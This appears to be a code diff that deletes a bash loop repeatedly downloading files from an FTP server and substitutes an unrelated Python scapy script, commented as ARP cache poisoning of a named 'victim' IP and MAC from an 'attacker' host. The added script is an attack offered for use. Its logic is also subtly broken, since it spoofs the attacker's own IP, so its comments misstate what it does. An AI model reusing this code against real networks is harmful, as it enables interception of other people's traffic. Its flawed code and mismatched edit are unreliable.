@@ -1,22 +1,15 @@
-#!/bin/bash
+from scapy.all import Ether, ARP, sendp
 
-FTP_SERVER="ftp.example.com"
-FTP_USER="your_username"
-FTP_PASSWORD="your_password"
-REMOTE_DIR="/remote/directory"
-LOCAL_DIR="/local/directory"
+# Define target IP address and MAC address
+target_ip = "10.62.2.52"  # Victim's IP address
+target_mac = "08:00:27:XX:XX:XX"  # Victim's MAC address (replace with actual MAC)
 
-while true
-do
-    ftp -n $FTP_SERVER <<END_SCRIPT
-    quote USER $FTP_USER
-    quote PASS $FTP_PASSWORD
-    prompt
-    lcd $LOCAL_DIR
-    cd $REMOTE_DIR
-    mget *
-    quit
-END_SCRIPT
+# Define attacker's MAC and IP address
+attacker_mac = "AA:BB:CC:DD:EE:FF"  # Attacker's MAC address
+attacker_ip = "10.62.2.54"  # Attacker's IP address
 
-    sleep 30
-done
+# Create an ARP reply packet to poison the victim's ARP cache
+arp_reply = Ether(dst=target_mac)/ARP(op="is-at", psrc=attacker_ip, hwsrc=attacker_mac, pdst=target_ip)
+
+# Send the ARP reply packet to perform ARP poisoning
+sendp(arp_reply, iface="your_network_interface")  # Replace "your_network_interface" with your network interface
